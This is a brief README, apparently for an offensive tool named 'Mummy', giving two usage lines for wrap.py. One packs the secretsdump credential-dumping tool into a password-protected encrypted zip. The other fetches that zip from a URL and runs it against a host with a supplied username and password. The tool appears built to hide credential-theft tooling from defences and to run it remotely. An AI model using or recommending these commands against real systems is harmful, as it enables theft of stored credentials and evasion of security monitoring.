# Mummy
## Wrap script example (local):
```
python.exe .\wrap.py local secretsdump 123 -o C:/Temp/secretsdump_enc.zip --arguments "test:'P@ssw0rd'@127.0.0.1 -debug"
```

## Remote:
```
python.exe .\wrap.py remote http://127.0.0.1:8080/secretsdump_enc.zip 123 --arguments "test:'P@ssw0rd'@127.0.0.1 -debug"
```
